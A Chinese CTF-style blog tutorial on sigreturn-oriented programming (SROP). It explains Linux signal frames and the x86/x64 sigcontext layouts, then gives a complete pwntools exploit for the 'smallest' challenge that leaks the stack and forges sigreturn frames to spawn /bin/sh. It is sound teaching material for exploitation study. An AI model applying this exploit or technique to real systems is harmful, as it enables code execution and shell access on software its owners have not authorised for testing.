---
title: 高级ROP-SROP
date:   2020-07-14 13:53:09
updated:  2020-07-14 13:53:09
tags:
    - 高级ROP
    - wiki
    - pwn
    - SROP
categories: 
	- 二进制安全
	- wiki-pwn
use:
  - Valine
text: true
lazyload: true
count: true
---
# 1.signal机制

signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。

比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：

![image.png](https://i.loli.net/2020/11/17/itIconjBQhLFXgJ.png)

1. 内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。
2. 内核会为该进程保存相应的上下文，**主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址**。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。**需要注意的是，这一部分是在用户进程的地址空间的。**之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。

![image.png](https://i.loli.net/2020/11/17/SUEl5TLdnqJz9V1.png)

对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext

```c
//x86
struct sigcontext
{
  unsigned short gs, __gsh;
  unsigned short fs, __fsh;
  unsigned short es, __esh;
  unsigned short ds, __dsh;
  unsigned long edi;
  unsigned long esi;
  unsigned long ebp;
  unsigned long esp;
  unsigned long ebx;
  unsigned long edx;
  unsigned long ecx;
  unsigned long eax;
  unsigned long trapno;
  unsigned long err;
  unsigned long eip;
  unsigned short cs, __csh;
  unsigned long eflags;
  unsigned long esp_at_signal;
  unsigned short ss, __ssh;
  struct _fpstate * fpstate;
  unsigned long oldmask;
  unsigned long cr2;
};
```



```c
//x64
struct _fpstate
{
  /* FPU environment matching the 64-bit FXSAVE layout.  */
  __uint16_t        cwd;
  __uint16_t        swd;
  __uint16_t        ftw;
  __uint16_t        fop;
  __uint64_t        rip;
  __uint64_t        rdp;
  __uint32_t        mxcsr;
  __uint32_t        mxcr_mask;
  struct _fpxreg    _st[8];
  struct _xmmreg    _xmm[16];
  __uint32_t        padding[24];
};

struct sigcontext
{
  __uint64_t r8;
  __uint64_t r9;
  __uint64_t r10;
  __uint64_t r11;
  __uint64_t r12;
  __uint64_t r13;
  __uint64_t r14;
  __uint64_t r15;
  __uint64_t rdi;
  __uint64_t rsi;
  __uint64_t rbp;
  __uint64_t rbx;
  __uint64_t rdx;
  __uint64_t rax;
  __uint64_t rcx;
  __uint64_t rsp;
  __uint64_t rip;
  __uint64_t eflags;
  unsigned short cs;
  unsigned short gs;
  unsigned short fs;
  unsigned short __pad0;
  __uint64_t err;
  __uint64_t trapno;
  __uint64_t oldmask;
  __uint64_t cr2;
  __extension__ union
    {
      struct _fpstate * fpstate;
      __uint64_t __fpstate_word;
    };
  __uint64_t __reserved1 [8];
};
```

signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。

# 2.攻击原理

Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。

首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息

![image.png](https://i.loli.net/2020/11/17/BvEsTjK5pDawZRP.png)

当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。

需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可

- **控制栈指针。**
- **把原来 rip 指向的`syscall` gadget 换成`syscall; ret` gadget。**

如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。

![image.png](https://i.loli.net/2020/11/17/gT3HLfykM1zSWdV.png)

需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件

- **可以通过栈溢出来控制栈的内容**
- **需要知道相应的地址**

- - **"/bin/sh"**
  - **Signal Frame**
  - **syscall**
  - **sigreturn**

- 需要有够大的空间来塞下整个 sigal frame

值得一说的是，对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，**比****如说 read 函数的返回值为读取的字节数**。

# 3.例题

360 春秋杯中的 smallest-pwn

## 1.查看

![image.png](https://i.loli.net/2020/11/17/NSULzHvwal3PtWG.png)

## 2.ida分析

![image.png](https://i.loli.net/2020/11/17/fEZVvo4KusmPFSb.png)

只有这么一小段，首先异或置rax为0，布置rsi参数为rsp（栈），rdi为0，edx为400h，最后调用系统调用 ，则就是read(0,$rsp,400)，即向栈顶读入 400 个字符。

## 3.利用思路

由于程序中并没有 sigreturn 调用，所以我们得自己构造，正好这里有 read 函数调用，所以我们可以通过 read 函数读取的字节数来设置 rax 的值。重要思路如下

- 通过控制 read 读取的字符数来设置 RAX 寄存器的值，从而执行 sigreturn
- 通过 syscall 执行 execve("/bin/sh",0,0) 来获取 shell。

| 系统调用  | 调用号 | 函数原型                                                     |
| --------- | ------ | ------------------------------------------------------------ |
| read      | 0      | read(int fd, void *buf, size_t count)                        |
| write     | 1      | write(int fd, const void *buf, size_t count)                 |
| sigreturn | 15     | int sigreturn(...)                                           |
| execve    | 59     | execve(const char *filename, char *const argv[],char *const envp[]) |

```python
from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
if args['REMOTE']:
    sh = remote('127.0.0.1', 7777)
else:
    sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0
## set start addr three times
payload = p64(start_addr) * 3
sh.send(payload)#首先,发送start_addr的地址,因为是写在栈顶的,所以就是read的返回地址
#会返回到start_addr

sh.send('\xb3')#返回后再次调用read函数的时候输入一个字节,read函数会把读入的字节数放到rax
#这样就达到了rax置为1的目的，同时会把rsp的后一位写为\xB3,这样返回地址就不是start_addr了
#而是4000B3,这就避免了rax被xor置零
stack_addr = u64(sh.recv()[8:16])
#此时,回去syscall调用write函数里，输出的就是栈上的0x400长度的内容
#别忘了当是输入的是3个start_addr,所以前八个字节是start_addr，后面的才是我们要用的
log.success('leak stack addr :' + hex(stack_addr))

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
#相当于read(0,stack_addr,0x400),同时返回地址是start_addr
payload = p64(start_addr) + 'a' * 8 + str(sigframe)
sh.send(payload)

## set rax=15 and call sigreturn
sigreturn = p64(syscall_ret) + 'b' * 7
sh.send(sigreturn)

## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
sh.send(payload)
sh.send(sigreturn)
sh.interactive()
```

   其基本流程为

- 读取三个程序起始地址
- 程序返回时，利用第一个程序起始地址读取地址，修改返回地址 (即第二个程序起始地址) 为源程序的第二条指令，并且会设置 rax=1
- 那么此时将会执行 write(1,$esp,0x400)，泄露栈地址。
- 利用第三个程序起始地址进而读入 payload
- 再次读取构造 sigreturn 调用，进而将向栈地址所在位置读入数据，构造 execve('/bin/sh',0,0)
- 再次读取构造 sigreturn 调用，从而获取 shell。

![1.png](https://i.loli.net/2020/11/17/T5Kgjm8MydR1qJG.png)